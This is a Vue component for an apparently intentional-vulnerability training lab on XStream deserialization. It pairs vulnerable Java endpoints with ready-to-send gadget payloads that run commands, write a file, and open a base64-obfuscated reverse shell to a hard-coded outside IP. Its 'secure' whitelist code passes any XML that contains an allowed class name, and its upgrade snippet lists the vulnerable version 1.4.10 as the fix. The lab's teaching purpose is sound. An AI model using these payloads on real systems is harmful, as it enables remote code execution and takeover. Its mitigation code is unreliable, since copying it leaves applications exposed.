<template>
    <div class="root-div">
        <div class="vuln-info">
            <div class="header-div">组件漏洞 -- XStream反序列化漏洞</div>
            <div class="body-div">
                <el-tabs v-model="activeName" @tab-click="handleClick">
                    <el-tab-pane label="漏洞描述" name="first">
                        <div class="vuln-detail">
                            XStream反序列化漏洞是指由于使用不安全的XStream进行XML/JSON数据反序列化，导致攻击者可以通过构造恶意XML/JSON数据触发反序列化漏洞，从而在目标系统上执行任意代码。<br/><br/>
                            <span style="color: red;">XStream是一个流行的Java库，用于将对象序列化为XML或JSON格式，以及从XML或JSON反序列化对象。在1.4.10及更早版本中，XStream默认允许反序列化任意Java类，这导致了严重的安全漏洞。</span><br />
                            <br/>
                            漏洞原理：<br/>
                            1. XStream默认允许反序列化任意Java类<br/>
                            2. 攻击者可以通过XML标签语法指定任意类进行实例化<br/>
                            3. 利用Runtime、ProcessBuilder等危险类执行系统命令<br/>
                            4. 通过JNDI注入、URLClassLoader等方式实现远程代码执行<br/>
                            <br/>
                            常见原因：<br/>
                            1. 直接使用XStream反序列化不可信的XML/JSON数据<br/>
                            2. 未对输入数据进行严格的类型验证和过滤<br/>
                            3. 未配置类白名单，允许危险类的加载<br/>
                            4. 未升级到安全版本或使用安全的替代方案<br/>
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="漏洞危害" name="second">
                        <div class="vuln-detail">
                            1. 远程代码执行（RCE）：攻击者可以在目标系统上执行任意命令<br/>
                            2. 文件系统操作：可以读取、写入、删除系统文件<br/>
                            3. 网络连接：可以建立网络连接，进行数据外泄或反向连接<br/>
                            4. 系统信息泄露：可以获取系统配置、环境变量等敏感信息<br/>
                            5. 权限提升：可能获取更高权限，完全控制目标系统<br/>
                            6. 横向移动：在内部网络中进一步扩散攻击<br/>
                            7. 数据泄露：可能导致数据库密码、API密钥等敏感数据泄露<br/>
                            8. 拒绝服务：通过恶意代码消耗系统资源，导致服务不可用<br/>
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="安全编码" name="third">
                        <div class="vuln-detail">
                            【必须】使用XStream安全配置<br/>
                            使用XStream.allowTypes()方法限制允许反序列化的类，只允许可信任的类。<br/>
                            <br/>
                            【必须】实施类白名单验证<br/>
                            如果必须使用XStream，应实施严格的类白名单验证，只允许反序列化可信任的类。<br/>
                            <br/>
                            【必须】对输入数据进行严格验证<br/>
                            对XML/JSON输入数据进行格式验证、类型检查，确保只处理预期的数据结构。<br/>
                            <br/>
                            【建议】升级到安全版本<br/>
                            升级到XStream 1.4.11或更高版本，这些版本默认启用了安全配置。<br/>
                            <br/>
                            【建议】使用安全的替代方案<br/>
                            考虑使用其他更安全的序列化库，如Jackson、Gson等，或实现自定义的安全解析逻辑。
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="参考文章" name="fourth">
                        <div class="vuln-detail">
                            <b>相关技术文档和参考资源：</b>
                            <br/><br/>
                            <b>官方文档：</b>
                            <ul>
                                <li><a href="http://xstream.codehaus.org/" target="_blank" style="text-decoration: underline;">XStream官方文档</a></li>
                                <li><a href="http://xstream.codehaus.org/security.html" target="_blank" style="text-decoration: underline;">XStream安全指南</a></li>
                            </ul>
                            <br/>
                            <b>安全最佳实践：</b>
                            <ul>
                                <li><a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization" target="_blank" style="text-decoration: underline;">OWASP A08:2021 - 软件和数据完整性故障</a></li>
                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" target="_blank" style="text-decoration: underline;">OWASP反序列化安全检查清单</a></li>
                            </ul>
                            <br/>
                            <b>漏洞分析文章：</b>
                            <ul>
                                <li><a href="https://blog.csdn.net/qq_45521281/article/details/106647490" target="_blank" style="text-decoration: underline;">XStream反序列化漏洞分析</a></li>
                                <li><a href="https://www.veracode.com/blog/secure-development/deserialization-vulnerabilities" target="_blank" style="text-decoration: underline;">反序列化漏洞安全分析</a></li>
                            </ul>
                            <br/>
                            <b>工具和检测：</b>
                            <ul>
                                <li><a href="https://github.com/frohoff/ysoserial" target="_blank" style="text-decoration: underline;">ysoserial - 反序列化漏洞利用工具</a></li>
                                <li><a href="https://github.com/OWASP/CheatSheetSeries" target="_blank" style="text-decoration: underline;">OWASP安全配置检查清单</a></li>
                            </ul>
                        </div>
                    </el-tab-pane>
                </el-tabs>
            </div>
        </div>
        <div class="code-demo">
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">XStream序列化和反序列化介绍<div>
                                <el-button type="primary" round size="mini"
                                    @click="fetchDataAndFillTable1">去测试</el-button>
                            </div></el-row>
                                                 <pre v-highlightjs><code class="java">// XStream序列化和反序列化介绍
// 1. XStream序列化Person对象为XML
Person person = new Person();
person.setName("张三");
person.setAge(25);
String xml = serializeToXML(person);

// 2. XStream反序列化XML为Person对象
Object result = deserializeFromXML(xml);

// 3. XStream序列化Person对象为JSON
String json = serializeToJSON(person);

// 4. XStream反序列化JSON为Person对象
Object result2 = deserializeFromJSON(json);

// 后端代码 - XML序列化接口
@PostMapping("/serializePersonToXml")
public Result serializePersonToXml(@RequestBody Person person) {
    try {
        String xmlResult = serializeToXML(person);
        return Result.success("XStream XML序列化Person对象成功: " + xmlResult);
    } catch (Exception e) {
        return Result.error("XStream XML序列化异常: " + e.getMessage());
    }
}

// 后端代码 - XML反序列化接口
@PostMapping("/deserializePersonFromXml")
public Result deserializePersonFromXml(@RequestBody String xmlData) {
    try {
        if (xmlData == null || xmlData.trim().isEmpty()) {
            return Result.error("XML数据不能为空");
        }
        
        // 反序列化XML数据为Person对象
        Object result = deserializeFromXML(xmlData);
        return Result.success("XStream XML反序列化成功: " + result.toString());
    } catch (Exception e) {
        return Result.error("XStream XML反序列化异常: " + e.getMessage());
    }
}

// 后端代码 - JSON序列化接口
@PostMapping("/serializePersonToJson")
public Result serializePersonToJson(@RequestBody Person person) {
    try {
        String jsonResult = serializeToJSON(person);
        return Result.success("XStream JSON序列化Person对象成功: " + jsonResult);
    } catch (Exception e) {
        return Result.error("XStream JSON序列化异常: " + e.getMessage());
    }
}

// 后端代码 - JSON反序列化接口
@PostMapping("/deserializePersonFromJson")
public Result deserializePersonFromJson(@RequestBody String jsonData) {
    try {
        if (jsonData == null || jsonData.trim().isEmpty()) {
            return Result.error("JSON数据不能为空");
        }
        
        // 反序列化JSON数据为Person对象
        Object result = deserializeFromJSON(jsonData);
        return Result.success("XStream JSON反序列化成功: " + result.toString());
    } catch (Exception e) {
        return Result.error("XStream JSON反序列化异常: " + e.getMessage());
    }
}

// XML序列化方法
private String serializeToXML(Object obj) throws IOException {
    XStream xstream = new XStream();
    xstream.alias("person", Person.class);
    return xstream.toXML(obj);
}

// XML反序列化方法
private Object deserializeFromXML(String xmlStr) throws IOException {
    XStream xstream = new XStream();
    xstream.alias("person", Person.class);
    return xstream.fromXML(xmlStr);
}

// JSON序列化方法
private String serializeToJSON(Object obj) throws IOException {
    XStream xstream = new XStream(new JettisonMappedXmlDriver());
    xstream.alias("person", Person.class);
    return xstream.toXML(obj);
}

// JSON反序列化方法
private Object deserializeFromJSON(String jsonStr) throws IOException {
    XStream xstream = new XStream(new JettisonMappedXmlDriver());
    xstream.alias("person", Person.class);
    return xstream.fromXML(jsonStr);
}
</code></pre>
                    </div>
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">XStream反序列化恶意对象-执行危险命令<div>
                                <el-button type="danger" round size="mini"
                                    @click="fetchDataAndFillTable2">去测试</el-button>
                            </div></el-row>
                                                 <pre v-highlightjs><code class="java">// XStream反序列化恶意对象-执行危险命令
// 恶意XML payload示例：

// 1. 使用ProcessBuilder执行系统命令 (macOS) - 如果是Windows系统，请自行修改payload
&lt;sorted-set&gt;
  &lt;string&gt;foo&lt;/string&gt;
  &lt;dynamic-proxy&gt;
    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
    &lt;handler class="java.beans.EventHandler"&gt;
      &lt;target class="java.lang.ProcessBuilder"&gt;
        &lt;command&gt;
          &lt;string&gt;open&lt;/string&gt;
          &lt;string&gt;-a&lt;/string&gt;
          &lt;string&gt;Calculator&lt;/string&gt;
        &lt;/command&gt;
      &lt;/target&gt;
      &lt;action&gt;start&lt;/action&gt;
    &lt;/handler&gt;
  &lt;/dynamic-proxy&gt;
&lt;/sorted-set&gt;

// 2. 写文件攻击 - 创建标志文件
&lt;sorted-set&gt;
  &lt;string&gt;foo&lt;/string&gt;
  &lt;dynamic-proxy&gt;
    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
    &lt;handler class="java.beans.EventHandler"&gt;
      &lt;target class="java.lang.ProcessBuilder"&gt;
        &lt;command&gt;
          &lt;string&gt;touch&lt;/string&gt;
          &lt;string&gt;/tmp/xstream_flag&lt;/string&gt;
        &lt;/command&gt;
      &lt;/target&gt;
      &lt;action&gt;start&lt;/action&gt;
    &lt;/handler&gt;
  &lt;/dynamic-proxy&gt;
&lt;/sorted-set&gt;

// 3. 反弹Shell攻击 - 建立反向连接 (Base64编码)
&lt;sorted-set&gt;
  &lt;string&gt;foo&lt;/string&gt;
  &lt;dynamic-proxy&gt;
    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
    &lt;handler class="java.beans.EventHandler"&gt;
      &lt;target class="java.lang.ProcessBuilder"&gt;
        &lt;command&gt;
          &lt;string&gt;bash&lt;/string&gt;
          &lt;string&gt;-c&lt;/string&gt;
          &lt;string&gt;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS42Mi4xMTYuMTY5LzEyMzQgMD4mMQo=}|{base64,-d}|{bash,-i}&lt;/string&gt;
        &lt;/command&gt;
      &lt;/target&gt;
      &lt;action&gt;start&lt;/action&gt;
    &lt;/handler&gt;
  &lt;/dynamic-proxy&gt;
&lt;/sorted-set&gt;

// 后端漏洞代码
@PostMapping("/vuln1")
public Result xstreamVuln1(@RequestBody String xmlData) {
    try {
        Object result = deserializeFromXML(xmlData);
        return Result.success("恶意对象反序列化成功: " + result.toString());
    } catch (Exception e) {
        return Result.error("反序列化异常: " + e.getMessage());
    }
}
</code></pre>
                    </div>
                </el-col>
            </el-row>
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 使用白名单验证<div>
                                <el-button type="success" round size="mini"
                                    @click="fetchDataAndFillTable3">去测试</el-button>
                            </div></el-row>
                            <pre v-highlightjs><code class="java">// 安全代码 - 使用白名单验证
// 检查是否在白名单中
private boolean isAllowedClass(String xmlData) {
    String[] allowedClasses = {
        "icu.secnotes.pojo.Person",
        "java.lang.String",
        "java.lang.Integer",
        "java.lang.Long",
        "java.lang.Double",
        "java.lang.Float",
        "java.lang.Boolean",
        "java.util.ArrayList",
        "java.util.HashMap",
        "java.util.LinkedHashMap"
    };
    
    // 检查XML中是否包含允许的类
    for (String allowedClass : allowedClasses) {
        if (xmlData.contains(allowedClass)) {
            return true;
        }
    }
    return false;
}

// 安全反序列化
@PostMapping("/sec1")
public Result xstreamSec1(@RequestBody String xmlData) {
    try {
        // 检查是否在白名单中
        if (!isAllowedClass(xmlData)) {
            return Result.error("安全策略：检测到非白名单类，拒绝反序列化");
        }
        
        Object result = deserializeFromXML(xmlData);
        return Result.success("安全反序列化成功: " + result.toString());
    } catch (Exception e) {
        return Result.error("反序列化异常: " + e.getMessage());
    }
}
</code></pre>
                    </div>
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 使用白名单验证2<div>
                                <el-button type="success" round size="mini"
                                    @click="fetchDataAndFillTable4">去测试</el-button>
                            </div></el-row>
                            <pre v-highlightjs><code class="java">// 安全代码 - 使用白名单验证2
// 使用allowTypes方法进行白名单验证
private Object deserializeFromXMLSecurely(String xmlStr) throws IOException {
    XStream xstream = new XStream();
    
    // 安全配置：只允许特定类（白名单验证）
    xstream.allowTypes(new Class[]{Person.class});
    
    // 设置别名
    xstream.alias("person", Person.class);
    
    return xstream.fromXML(xmlStr);
}

// 安全反序列化
@PostMapping("/sec2")
public Result xstreamSec2(@RequestBody String xmlData) {
    try {
        // 使用白名单验证的XStream进行反序列化
        Object result = deserializeFromXMLSecurely(xmlData);
        return Result.success("白名单验证反序列化成功: " + result.toString());
    } catch (Exception e) {
        return Result.error("反序列化异常: " + e.getMessage());
    }
}

// 升级依赖版本到1.4.11+
// &lt;dependency&gt;
//     &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;
//     &lt;artifactId&gt;xstream&lt;/artifactId&gt;
//     &lt;version&gt;1.4.11&lt;/version&gt;
// &lt;/dependency&gt;
</code></pre>
                    </div>
                </el-col>
            </el-row>
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 升级XStream版本<div>
                            </div></el-row>
                            <pre v-highlightjs><code class="xml">// 安全代码 - 升级XStream版本
// 在pom.xml中升级XStream依赖版本到安全版本

&lt;dependency&gt;
    &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;
    &lt;artifactId&gt;xstream&lt;/artifactId&gt;
    &lt;version&gt;1.4.10&lt;/version&gt;
&lt;/dependency&gt;

// 或者升级到最新稳定版本
&lt;dependency&gt;
    &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;
    &lt;artifactId&gt;xstream&lt;/artifactId&gt;
    &lt;version&gt;1.4.20&lt;/version&gt;
&lt;/dependency&gt;

// 新版本XStream默认启用了安全配置
// 1. 默认阻止所有类型
// 2. 需要显式允许需要的类型
// 3. 修复了多个反序列化漏洞

// 使用新版本的安全配置示例
XStream xstream = new XStream();
xstream.addPermission(NoTypePermission.NONE);
xstream.allowTypes(new Class[]{Person.class});
</code></pre>
                    </div>
                </el-col>
            </el-row>
        </div>

        <!-- 打开嵌套表格的对话框1 - 基础功能演示 -->
        <el-dialog title="XStream序列化和反序列化介绍" :visible.sync="dialogFormVisible1" class="center-dialog" width="60%">
            <div style="text-align: center; color: blue; font-style: italic; margin-bottom: 20px;">
                展示XStream序列化和反序列化的完整流程：支持XML和JSON两种格式的转换
            </div>
            <div style="margin-bottom: 20px;">
                <el-tabs v-model="basicTab" type="card" style="text-align: center;">
                    <el-tab-pane label="序列化操作" name="serialize">
                        <el-form :model="basicForm" :inline="true" class="demo-form-inline">
                            <el-form-item label="姓名" label-width="80px">
                                <el-input v-model="basicForm.name" placeholder="请输入姓名" style="width: 200px;"></el-input>
                            </el-form-item>
                            <br />
                            <el-form-item label="年龄" label-width="80px">
                                <el-input-number v-model="basicForm.age" :min="1" :max="150" style="width: 200px;"></el-input-number>
                            </el-form-item>
                            <br />
                            <el-form-item>
                                <el-button type="primary" @click="serializePerson">序列化并输出XML</el-button>
                            </el-form-item>
                        </el-form>
                        <div v-if="serializeResult" style="margin-top: 15px;">
                            <h4 style="margin: 0 0 10px 0; color: #409EFF;">序列化结果：</h4>
                            <pre style="margin: 0; white-space: pre-wrap; word-wrap: break-word; font-size: 12px; background-color: #f0f9ff; padding: 10px; border: 1px solid #409EFF; border-radius: 4px;">{{ serializeResult }}</pre>
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="反序列化操作" name="deserialize">
                        <el-form class="demo-form-inline">
                            <el-form-item label="XML数据" label-width="80px">
                                <el-input 
                                    type="textarea" 
                                    v-model="normalXmlData" 
                                    :rows="8"
                                    placeholder="请输入Person对象的XML数据"
                                    style="width: 400px;"></el-input>
                            </el-form-item>
                            <el-form-item>
                                <el-button type="success" @click="deserializePerson">反序列化XML</el-button>
                            </el-form-item>
                        </el-form>
                        <div v-if="deserializeResult" style="margin-top: 15px;">
                            <h4 style="margin: 0 0 10px 0; color: #67C23A;">反序列化结果：</h4>
                            <pre style="margin: 0; white-space: pre-wrap; word-wrap: break-word; font-size: 12px; background-color: #f0f9ff; padding: 10px; border: 1px solid #67C23A; border-radius: 4px;">{{ deserializeResult }}</pre>
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="JSON序列化操作" name="jsonSerialize">
                        <el-form :model="basicForm" :inline="true" class="demo-form-inline">
                            <el-form-item label="姓名" label-width="80px">
                                <el-input v-model="basicForm.name" placeholder="请输入姓名" style="width: 200px;"></el-input>
                            </el-form-item>
                            <br />
                            <el-form-item label="年龄" label-width="80px">
                                <el-input-number v-model="basicForm.age" :min="1" :max="150" style="width: 200px;"></el-input-number>
                            </el-form-item>
                            <br />
                            <el-form-item>
                                <el-button type="primary" @click="serializePersonToJson">序列化并输出JSON</el-button>
                            </el-form-item>
                        </el-form>
                        <div v-if="jsonSerializeResult" style="margin-top: 15px;">
                            <h4 style="margin: 0 0 10px 0; color: #409EFF;">JSON序列化结果：</h4>
                            <pre style="margin: 0; white-space: pre-wrap; word-wrap: break-word; font-size: 12px; background-color: #f0f9ff; padding: 10px; border: 1px solid #409EFF; border-radius: 4px;">{{ jsonSerializeResult }}</pre>
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="JSON反序列化操作" name="jsonDeserialize">
                        <el-form class="demo-form-inline">
                            <el-form-item label="JSON数据" label-width="80px">
                                <el-input 
                                    type="textarea" 
                                    v-model="normalJsonData" 
                                    :rows="8"
                                    placeholder="请输入Person对象的JSON数据"
                                    style="width: 400px;"></el-input>
                            </el-form-item>
                            <el-form-item>
                                <el-button type="success" @click="deserializePersonFromJson">反序列化JSON</el-button>
                            </el-form-item>
                        </el-form>
                        <div v-if="jsonDeserializeResult" style="margin-top: 15px;">
                            <h4 style="margin: 0 0 10px 0; color: #67C23A;">JSON反序列化结果：</h4>
                            <pre style="margin: 0; white-space: pre-wrap; word-wrap: break-word; font-size: 12px; background-color: #f0f9ff; padding: 10px; border: 1px solid #67C23A; border-radius: 4px;">{{ jsonDeserializeResult }}</pre>
                        </div>
                    </el-tab-pane>
                </el-tabs>
            </div>
        </el-dialog>

        <!-- 打开嵌套表格的对话框2 - 恶意对象测试 -->
        <el-dialog title="XStream反序列化恶意对象测试" :visible.sync="dialogFormVisible2" class="center-dialog">
            <div style="text-align: left; color: red; font-style: italic;">
                注意：这些payload会执行系统命令或进行网络探测，请谨慎测试！
            </div>
            <el-form class="demo-form-inline">
                <el-form-item label="ProcessBuilder Payload (macOS) - 如果是Windows系统，请自行修改payload">
                    <el-input v-model="processBuilderPayloadMac" type="textarea" :rows="12"></el-input>
                </el-form-item>
                <el-form-item label="写文件 Payload">
                    <el-input v-model="writeFilePayload" type="textarea" :rows="4" placeholder="用于写文件攻击的XML payload"></el-input>
                </el-form-item>
                <el-form-item label="反弹Shell Payload">
                    <el-input v-model="reverseShellPayload" type="textarea" :rows="4" placeholder="用于反弹shell攻击的XML payload"></el-input>
                </el-form-item>
                <el-form-item>
                    <el-button type="danger" @click="onSubmitProcessBuilderMac">ProcessBuilder测试</el-button>
                    <el-button type="warning" @click="onSubmitWriteFile">写文件测试</el-button>
                    <el-button type="danger" @click="onSubmitReverseShell">反弹Shell测试</el-button>
                </el-form-item>
            </el-form>
            <div>
                <template>
                    <div v-html="resp_text2"></div>
                </template>
            </div>
        </el-dialog>

        <!-- 打开嵌套表格的对话框3 - 安全代码测试 -->
        <el-dialog title="XStream安全代码测试 - 白名单验证" :visible.sync="dialogFormVisible3" class="center-dialog">
            <div style="text-align: left; color: green; font-style: italic;">
                安全代码使用白名单验证，可以有效防止恶意攻击
            </div>
            <el-form class="demo-form-inline">
                <el-form-item label="Person对象XML数据">
                    <el-input v-model="normalXmlData" type="textarea" :rows="6"></el-input>
                </el-form-item>
                <el-form-item label="恶意ProcessBuilder Payload">
                    <el-input v-model="processBuilderPayloadMac" type="textarea" :rows="6"></el-input>
                </el-form-item>
                <el-form-item>
                    <el-button type="primary" @click="onSubmitSecNormal">正常数据测试</el-button>
                    <el-button type="danger" @click="onSubmitSecMalicious">恶意数据测试</el-button>
                </el-form-item>
            </el-form>
            <div>
                <template>
                    <div v-html="resp_text3"></div>
                </template>
            </div>
        </el-dialog>

        <!-- 打开嵌套表格的对话框4 - 安全配置测试 -->
        <el-dialog title="XStream安全代码测试 - 安全配置" :visible.sync="dialogFormVisible4" class="center-dialog">
            <div style="text-align: left; color: green; font-style: italic;">
                使用XStream.allowTypes()方法限制允许的类，提供更强的安全保护
            </div>
            <el-form class="demo-form-inline">
                <el-form-item label="Person对象XML数据">
                    <el-input v-model="normalXmlData" type="textarea" :rows="6"></el-input>
                </el-form-item>
                <el-form-item label="恶意ProcessBuilder Payload">
                    <el-input v-model="processBuilderPayloadMac" type="textarea" :rows="6"></el-input>
                </el-form-item>
                <el-form-item>
                    <el-button type="primary" @click="onSubmitSec2Normal">正常数据测试</el-button>
                    <el-button type="danger" @click="onSubmitSec2Malicious">恶意数据测试</el-button>
                </el-form-item>
            </el-form>
            <div>
                <template>
                    <div v-html="resp_text4"></div>
                </template>
            </div>
        </el-dialog>


    </div>
</template>

<script>
import { xstreamVuln1, xstreamSec1, xstreamSec2, xstreamBasicTest, serializePerson, serializePersonToJson, deserializePersonFromJson } from '@/api/xstream';

export default {
    data() {
        return {
            activeName: 'first',
            dialogFormVisible1: false,
            dialogFormVisible2: false,
            dialogFormVisible3: false,
            dialogFormVisible4: false,

            
            // 基础序列化/反序列化相关
            basicTab: 'serialize',
            basicForm: {
                name: '张三',
                age: 25
            },
            serializeResult: '',
            deserializeResult: '',
            jsonSerializeResult: '',
            jsonDeserializeResult: '',
            normalXmlData: '<icu.secnotes.pojo.Person><name>张三</name><age>25</age></icu.secnotes.pojo.Person>',
            normalJsonData: '{"person": {"name": "张三", "age": 25}}',
            
            // 恶意对象测试相关
            processBuilderPayloadMac: '<sorted-set>\n  <string>foo</string>\n  <dynamic-proxy>\n    <interface>java.lang.Comparable</interface>\n    <handler class="java.beans.EventHandler">\n      <target class="java.lang.ProcessBuilder">\n        <command>\n          <string>open</string>\n          <string>-a</string>\n          <string>Calculator</string>\n        </command>\n      </target>\n      <action>start</action>\n    </handler>\n  </dynamic-proxy>\n</sorted-set>',
            writeFilePayload: '<sorted-set>\n  <string>foo</string>\n  <dynamic-proxy>\n    <interface>java.lang.Comparable</interface>\n    <handler class="java.beans.EventHandler">\n      <target class="java.lang.ProcessBuilder">\n        <command>\n          <string>touch</string>\n          <string>/tmp/xstream_flag</string>\n        </command>\n      </target>\n      <action>start</action>\n    </handler>\n  </dynamic-proxy>\n</sorted-set>',
            reverseShellPayload: '<sorted-set>\n  <string>foo</string>\n  <dynamic-proxy>\n    <interface>java.lang.Comparable</interface>\n    <handler class="java.beans.EventHandler">\n      <target class="java.lang.ProcessBuilder">\n        <command>\n          <string>bash</string>\n          <string>-c</string>\n          <string>{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS42Mi4xMTYuMTY5LzEyMzQgMD4mMQo=}|{base64,-d}|{bash,-i}</string>\n        </command>\n      </target>\n      <action>start</action>\n    </handler>\n  </dynamic-proxy>\n</sorted-set>',
            resp_text2: '',
            resp_text3: '',
            resp_text4: '',
        };
    },
    methods: {
        handleClick(tab, event) {
            // 标签页切换处理
        },
        fetchDataAndFillTable1() {
            this.dialogFormVisible1 = true;
            this.serializeResult = '';
            this.deserializeResult = '';
            this.jsonSerializeResult = '';
            this.jsonDeserializeResult = '';
        },
        fetchDataAndFillTable2() {
            this.dialogFormVisible2 = true;
            this.resp_text2 = '';
        },
        fetchDataAndFillTable3() {
            this.dialogFormVisible3 = true;
            this.resp_text3 = '';
        },
        fetchDataAndFillTable4() {
            this.dialogFormVisible4 = true;
            this.resp_text4 = '';
        },


        serializePerson() {
            if (!this.basicForm.name || !this.basicForm.age) {
                this.$message.error('请填写姓名和年龄');
                return;
            }
            serializePerson(this.basicForm).then(response => {
                this.serializeResult = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.serializeResult = 'Error fetching data: ' + error.message;
            });
        },
        deserializePerson() {
            if (!this.normalXmlData) {
                this.$message.error('XML数据不能为空');
                return;
            }
            xstreamBasicTest(this.normalXmlData).then(response => {
                this.deserializeResult = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.deserializeResult = 'Error fetching data: ' + error.message;
            });
        },
        serializePersonToJson() {
            if (!this.basicForm.name || !this.basicForm.age) {
                this.$message.error('请填写姓名和年龄');
                return;
            }
            serializePersonToJson(this.basicForm).then(response => {
                this.jsonSerializeResult = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.jsonSerializeResult = 'Error fetching data: ' + error.message;
            });
        },
        deserializePersonFromJson() {
            if (!this.normalJsonData) {
                this.$message.error('JSON数据不能为空');
                return;
            }
            deserializePersonFromJson(this.normalJsonData).then(response => {
                this.jsonDeserializeResult = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.jsonDeserializeResult = 'Error fetching data: ' + error.message;
            });
        },
        onSubmitProcessBuilderMac() {
            if (!this.processBuilderPayloadMac) {
                this.$message.error('ProcessBuilder Payload不能为空');
                return;
            }
            xstreamVuln1(this.processBuilderPayloadMac).then(response => {
                this.resp_text2 = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text2 = 'Error fetching data: ' + error.message;
            });
        },
        onSubmitWriteFile() {
            if (!this.writeFilePayload) {
                this.$message.error('写文件 Payload不能为空');
                return;
            }
            xstreamVuln1(this.writeFilePayload).then(response => {
                this.resp_text2 = response.data + "\n\n请检查/tmp/xstream_flag文件是否被创建";
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text2 = 'Error fetching data: ' + error.message;
            });
        },
        onSubmitReverseShell() {
            if (!this.reverseShellPayload) {
                this.$message.error('反弹Shell Payload不能为空');
                return;
            }
            xstreamVuln1(this.reverseShellPayload).then(response => {
                this.resp_text2 = response.data + "\n\n请检查是否成功建立反弹shell连接";
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text2 = 'Error fetching data: ' + error.message;
            });
        },
        onSubmitSecNormal() {
            if (!this.normalXmlData) {
                this.$message.error('Person对象XML数据不能为空');
                return;
            }
            xstreamSec1(this.normalXmlData).then(response => {
                this.resp_text3 = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text3 = 'Error fetching data: ' + error.message;
            });
        },
        onSubmitSecMalicious() {
            if (!this.processBuilderPayloadMac) {
                this.$message.error('恶意Payload不能为空');
                return;
            }
            xstreamSec1(this.processBuilderPayloadMac).then(response => {
                this.resp_text3 = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text3 = '安全策略成功阻止了恶意攻击: ' + error.message;
            });
        },
        onSubmitSec2Normal() {
            if (!this.normalXmlData) {
                this.$message.error('Person对象XML数据不能为空');
                return;
            }
            xstreamSec2(this.normalXmlData).then(response => {
                this.resp_text4 = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text4 = 'Error fetching data: ' + error.message;
            });
        },
        onSubmitSec2Malicious() {
            if (!this.processBuilderPayloadMac) {
                this.$message.error('恶意Payload不能为空');
                return;
            }
            xstreamSec2(this.processBuilderPayloadMac).then(response => {
                this.resp_text4 = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text4 = '安全配置成功阻止了恶意攻击: ' + error.message;
            });
        },
    }
};
</script>

<style>
.vuln-info {
    border-radius: 10px;
    margin: 10px 20px 20px 20px;
}

.header-div {
    font-size: 24px;
    color: #409EFF;
    font-weight: bold;
    padding: 10px;
    justify-content: center;
    align-items: center;
    border-bottom: 1px solid #ccc;
}

.body-div {
    padding: 10px;
    justify-content: center;
    align-items: center;
    font-family: Arial, sans-serif;
    font-size: 14px;
}

.vuln-detail {
    background-color: #dce9f8;
    padding: 10px;
}

.code-demo {
    margin: 20px;
    border-top: 1px solid #ccc;
    padding-top: 20px;
}

pre code {
    font-size: 12px;
}

.el-row {
    margin-bottom: 20px;
}

.el-row:last-child {
    margin-bottom: 0;
}

.el-col {
    border-radius: 4px;
}

.bg-purple-dark {
    background: #99a9bf;
}

.bg-purple {
    background: #d3dce6;
}

.bg-purple-light {
    background: #e5e9f2;
}

.grid-content {
    border-radius: 4px;
    height: 100%;
    padding: 10px;
}

.grid-flex {
    display: flex;
    align-items: stretch;
}

.row-bg {
    padding: 10px 0;
    background-color: #f9fafc;
}

.center-dialog {
    text-align: center;
    margin: 0 auto;
}

.center-dialog-table {
    text-align: center;
}

/* 确保选项卡居中对齐 */
.center-dialog .el-tabs__header {
    text-align: center;
}

.center-dialog .el-tabs__nav-wrap {
    text-align: center;
}

.center-dialog .el-tabs__nav {
    float: none;
    display: inline-block;
}
</style>
